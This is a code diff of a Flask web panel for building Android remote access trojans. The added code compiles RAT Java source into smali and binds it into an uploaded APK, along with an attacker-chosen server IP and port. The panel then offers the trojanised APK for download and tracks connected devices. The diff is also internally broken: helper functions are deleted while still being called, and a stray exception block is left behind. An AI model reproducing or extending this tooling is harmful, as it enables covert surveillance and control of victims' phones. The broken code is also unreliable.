@@ -11,7 +11,7 @@ import socket
 import json
 import requests
 import zipfile
-from advanced_apk_binder_fixed import AdvancedAPKBinderFixed
+from advanced_apk_binder import AdvancedAPKBinder
 from advanced_apk_binder_ultimate import UltimateAPKBinder
 
 app = Flask(__name__)
@@ -80,6 +80,50 @@ def log_cmd(username, message):
         "timestamp": int(time.time()),
         "message": message
     })
+
+
+def compile_rat_smali(username):
+    """Compiles the RAT Java source into smali files."""
+    append_flask_log(username, "Compiling RAT source to smali...")
+    
+    rat_dir = os.path.dirname(os.path.abspath(__file__))
+    src_dir = os.path.join(rat_dir, "src_java")
+    compiled_dir = os.path.join(src_dir, "compiled_classes")
+    dex_output_dir = os.path.join(src_dir, "dex_output")
+    smali_output_dir = os.path.join(rat_dir, "smali_templates")
+    android_jar = os.path.join(rat_dir, "android-14/android.jar")
+    json_jar = os.path.join(rat_dir, "libs/json-20250517.jar")
+
+    try:
+        if os.path.exists(compiled_dir):
+            shutil.rmtree(compiled_dir)
+        if os.path.exists(dex_output_dir):
+            shutil.rmtree(dex_output_dir)
+        os.makedirs(compiled_dir, exist_ok=True)
+        os.makedirs(dex_output_dir, exist_ok=True)
+
+        java_files = [os.path.join(src_dir, "com/example/android", f) for f in os.listdir(os.path.join(src_dir, "com/example/android")) if f.endswith(".java")]
+        compile_cmd = ['javac', '-d', compiled_dir, '-cp', f'{android_jar}:{json_jar}'] + java_files
+        run_cmd(username, " ".join(compile_cmd))
+
+        jar_path = os.path.join(compiled_dir, "compiled_rat_classes.jar")
+        jar_cmd = ['jar', '-cvf', jar_path, '-C', compiled_dir, '.']
+        run_cmd(username, " ".join(jar_cmd))
+        
+        d8_path = os.path.join(rat_dir, 'd8')
+        dex_cmd = [d8_path, '--output', dex_output_dir, jar_path, '--lib', android_jar, '--lib', json_jar]
+        run_cmd(username, " ".join(dex_cmd))
+
+        baksmali_jar = os.path.join(rat_dir, 'baksmali.jar')
+        smali_cmd = ['java', '-jar', baksmali_jar, 'disassemble', os.path.join(dex_output_dir, 'classes.dex'), '-o', smali_output_dir]
+        run_cmd(username, " ".join(smali_cmd))
+
+        append_flask_log(username, "RAT smali compilation successful.")
+        return smali_output_dir
+
+    except Exception as e:
+        append_flask_log(username, f"Error during RAT compilation: {e}")
+        raise
 
 def get_local_ip():
     """Get the local IP address in a more reliable way"""
@@ -299,10 +343,7 @@ def rat_connect():
 
 # No separate RAT handler needed - everything is integrated in Flask
 
-def get_user_folder(base_folder, username):
-    user_specific_folder = os.path.join(base_folder, username)
-    os.makedirs(user_specific_folder, exist_ok=True)
-    return user_specific_folder
+
 
 def login_required(f):
     @wraps(f)
@@ -336,31 +377,7 @@ def append_device_log(device_id, text):
         if len(logs) > 100:
             devices_data[device_id]['logs'] = logs[-100:]
 
-def run_cmd(username, cmd, cwd=None):
-    append_flask_log(username, f"$ {cmd}")
-    apktool_jar_path = r"C:\Tools\apktool.jar" # Ensure this path is correct for your system
-    actual_cmd_list = []
-    if cmd.startswith("apktool d"):
-        cmd_parts = cmd.split(" ", 2)
-        if len(cmd_parts) < 3: raise ValueError(f"Malformed apktool d command: {cmd}")
-        actual_cmd_list = ["java", "-jar", apktool_jar_path, cmd_parts[1]] + shlex.split(cmd_parts[2])
-    elif cmd.startswith("apktool b"):
-        cmd_parts = cmd.split(" ", 2)
-        if len(cmd_parts) < 3: raise ValueError(f"Malformed apktool b command: {cmd}")
-        actual_cmd_list = ["java", "-jar", apktool_jar_path, cmd_parts[1]] + shlex.split(cmd_parts[2])
-    else:
-        actual_cmd_list = shlex.split(cmd)
-    try:
-        proc = subprocess.Popen(actual_cmd_list, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
-        stdout_data, stderr_data = proc.communicate(timeout=300)
-        for line in stdout_data.splitlines():
-            append_flask_log(username, line.rstrip())
-        if stderr_data:
-            append_flask_log(username, f"CMD_ERROR_OUTPUT: {stderr_data.rstrip()}")
-        if proc.returncode != 0:
-            raise RuntimeError(f"Command failed with exit code {proc.returncode}: {cmd}\nOutput:\n{stdout_data}\nError Output:\n{stderr_data}")
-        return stdout_data
-    except subprocess.TimeoutExpired:
+
         proc.kill()
         stdout_data, stderr_data = proc.communicate()
         raise RuntimeError(f"Timeout occurred for command: {cmd}\nOutput:\n{stdout_data}\nError Output:\n{stderr_data}")
@@ -1347,25 +1364,8 @@ def bind_apk_fallback(apk_path, server_ip, server_port, work_dir):
 @app.route('/bind_advanced', methods=['GET', 'POST'])
 @login_required
 def bind_apk_advanced_route():
-    """Advanced APK binding route with universal compatibility"""
-    if request.method == 'GET':
-        # Get local IP address
-        local_ip = get_local_ip()
-        
-        # Try to get public IP
-        public_ip = "Non disponibile"
-        try:
-            response = requests.get('https://api.ipify.org', timeout=3)
-            if response.status_code == 200:
-                public_ip = response.text
-        except:
-            pass
-            
-        return render_template('bind_advanced.html', local_ip=local_ip, public_ip=public_ip)
-    
-    # Handle POST request
-    try:
-        # Check if the post request has the file part
+    username = session['username']
+    if request.method == 'POST':
         if 'apk_file' not in request.files:
             return jsonify({'error': 'No APK file uploaded'}), 400
         
@@ -1376,84 +1376,63 @@ def bind_apk_advanced_route():
         if not apk_file.filename.lower().endswith('.apk'):
             return jsonify({'error': 'File must be an APK'}), 400
         
-        # Get form data
         server_ip = request.form.get('server_ip', get_local_ip())
-        server_port = int(request.form.get('server_port', 12000))
-        binding_method = request.form.get('binding_method', 'auto')
+        server_port = request.form.get('server_port', 12000)
         
-        # Save the uploaded file
-        upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], session['username'])
-        timestamp = int(time.time())
+        upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username)
         original_filename = secure_filename(apk_file.filename)
-        apk_path = os.path.join(upload_folder, f"{timestamp}_{original_filename}")
+        apk_path = os.path.join(upload_folder, original_filename)
         apk_file.save(apk_path)
         
-        print(f"[ADVANCED BINDING] Starting for {original_filename}")
-        print(f"[ADVANCED BINDING] Size: {os.path.getsize(apk_path) / (1024*1024):.1f} MB")
-        print(f"[ADVANCED BINDING] Method: {binding_method}")
-        
-        # Create working directory
-        work_dir = os.path.join(upload_folder, f"work_{timestamp}")
-        os.makedirs(work_dir, exist_ok=True)
-        
-        # Use advanced binding
-        bound_apk = bind_apk_advanced(apk_path, server_ip, server_port, work_dir, binding_method)
-        
-        if bound_apk and os.path.exists(bound_apk):
-            print(f"[BINDING SUCCESS] APK bound successfully: {bound_apk}")
-            
-            # Copy to final location first
-            signed_apk = os.path.join(upload_folder, f"bound_{timestamp}_{original_filename}")
-            shutil.copy2(bound_apk, signed_apk)
-            print(f"[BINDING SUCCESS] APK copied to: {signed_apk}")
-            
-            # Try to sign the APK (optional)
-            try:
-                keystore_path = ensure_keystore(session['username'])
-                if os.path.exists(keystore_path):
-                    sign_cmd = f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "{keystore_path}" -storepass android -keypass android "{signed_apk}" androiddebugkey'
-                    run_cmd(session['username'], sign_cmd)
-                    print(f"[BINDING SUCCESS] APK signed successfully")
-                else:
-                    print(f"[BINDING SUCCESS] APK not signed (keystore not found)")
-            except Exception as e:
-                print(f"[BINDING SUCCESS] APK signing failed: {e} (continuing anyway)")
-            
-            # Clean up work directory
-            shutil.rmtree(work_dir, ignore_errors=True)
-            
-            # Verify final file exists
-            if os.path.exists(signed_apk):
-                file_size = os.path.getsize(signed_apk) / (1024*1024)
-                print(f"[BINDING SUCCESS] Final APK ready: {signed_apk} ({file_size:.1f} MB)")
+        output_filename = f"bound_{original_filename}"
+        output_apk_path = os.path.join(upload_folder, output_filename)
+
+        try:
+            # 1. Compile RAT smali code
+            smali_source_dir = compile_rat_smali(username)
+
+            # 2. Bind the APK using the corrected binder
+            binder = AdvancedAPKBinder()
+            bound_apk_path = binder.full_copy_binding(
+                apk_path,
+                smali_source_dir,
+                server_ip,
+                server_port,
+                output_apk_path
+            )
+
+            if bound_apk_path and os.path.exists(bound_apk_path):
+                file_size = os.path.getsize(bound_apk_path) / (1024*1024)
+                download_url = url_for('download_file', username=username, filename=output_filename)
                 
-                # Return success response
-                download_url = f"/download/{session['username']}/{os.path.basename(signed_apk)}"
                 return jsonify({
                     'success': True,
                     'download_url': download_url,
-                    'filename': os.path.basename(signed_apk),
-                    'message': f'APK bound successfully using {binding_method} method',
+                    'filename': output_filename,
+                    'message': 'APK bound successfully!',
                     'size': f"{file_size:.1f} MB"
                 })
             else:
-                print(f"[BINDING ERROR] Final APK file not found: {signed_apk}")
                 return jsonify({
-                    'error': 'APK binding completed but final file not found',
-                    'suggestion': 'Check server logs for file location details.'
+                    'error': 'APK binding failed. Check logs for details.',
+                    'suggestion': 'The APK might be protected. Try a different one.'
                 }), 500
-        else:
+
+        except Exception as e:
             return jsonify({
-                'error': 'APK binding failed. This APK may have advanced protection mechanisms.',
-                'suggestion': 'Try a different binding method or use a simpler APK for testing.'
+                'error': f'An unexpected error occurred: {str(e)}',
+                'suggestion': 'Check server logs for detailed error info.'
             }), 500
             
-    except Exception as e:
-        print(f"[ADVANCED BINDING ERROR] {str(e)}")
-        return jsonify({
-            'error': f'Binding error: {str(e)}',
-            'suggestion': 'Check server logs for detailed error information.'
-        }), 500
+    # For GET request
+    local_ip = get_local_ip()
+    public_ip = "Not available"
+    try:
+        public_ip = requests.get('https://api.ipify.org', timeout=3).text
+    except:
+        pass
+    return render_template('bind_advanced.html', local_ip=local_ip, public_ip=public_ip)
+
 
 @app.route('/bind', methods=['GET', 'POST'])
 @login_required
